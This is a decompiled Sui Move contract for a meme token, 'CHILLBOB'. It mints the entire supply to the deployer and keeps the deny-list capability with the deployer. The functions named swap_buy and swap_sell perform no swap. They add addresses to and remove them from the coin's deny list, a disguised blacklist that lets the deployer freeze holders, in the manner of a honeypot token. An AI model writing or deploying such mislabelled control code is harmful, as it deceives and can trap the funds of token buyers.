module 0xbdd0a76193347c0300812609bf54668673d1ff41fd2e01e151e2d5cf064dc0a7::chillbob {
    struct CHILLBOB has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHILLBOB, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLBOB>(arg0, 9, b"CHILLBOB", b"ChillBob copy and past him", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYRqqYQXss49eHtrxmwycMwr6ivxNyVNA8amhrSMwTSAJ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLBOB>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLBOB>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLBOB>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLBOB>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLBOB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLBOB>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLBOB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHILLBOB>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

